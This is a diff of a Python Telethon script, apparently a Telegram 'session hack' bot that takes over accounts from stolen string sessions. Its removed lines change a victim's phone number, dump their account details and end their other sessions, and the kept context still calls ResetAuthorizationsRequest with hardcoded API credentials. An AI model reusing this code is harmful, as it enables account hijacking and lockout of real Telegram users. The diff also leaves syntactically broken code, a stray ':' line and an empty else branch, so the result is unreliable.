@@ -17,46 +17,7 @@ from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
 import telethon;from telethon import functions
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
 
-from telethon.tl.functions.channels import CreateChannelRequest as ccr
-mybot = "missrose_bot"
-bot = borg = client
-
-
-
-
-async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    bot = client = X
-    try: 
-      result = await bot(functions.account.ChangePhoneRequest(
-        phone_number=number,
-        phone_code_hash=code,
-        phone_code=otp
-      ))
-      return True
-    except:
-      return False
-
-async def change_number(strses, number):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    bot = client = X
-    result = await bot(functions.account.SendChangePhoneCodeRequest(
-        phone_number=number,
-        settings=types.CodeSettings(
-            allow_flashcall=True,
-            current_number=True,
-            allow_app_hash=True
-        )
-    ))
-    return str(result)
-
-
-async def userinfo(strses):
-  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
-    k = await X.get_me()
-    return str(k)
-
-async def terminate(strses):
+:
   async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
     await X(rt())
 GROUP_LIST = []
@@ -381,10 +342,10 @@ async def start(event):
         await event.respond("SEND THIS ERROR TO - @sessionhack_chat\n**LOGS**\n" + str(e))
 
     else:
-      await event.respond("Wrong Text Found Re type /hack and use")
 
 
 
 
 
-client.run_until_disconnected()
+
+
